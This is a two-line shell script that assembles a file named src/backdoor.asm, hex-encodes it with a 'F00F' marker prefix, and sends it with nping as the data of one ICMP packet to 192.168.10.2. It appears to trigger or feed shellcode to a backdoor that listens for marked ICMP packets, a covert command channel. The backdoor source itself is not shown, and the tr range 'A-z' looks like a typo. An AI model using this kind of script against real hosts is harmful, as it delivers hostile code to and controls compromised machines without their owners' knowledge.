#!/bin/sh 

sudo nping --icmp 192.168.10.2 -c 1 --data $(nasm src/backdoor.asm && xxd -p src/backdoor | tr a-z A-z | sed 's/^/F00F/')
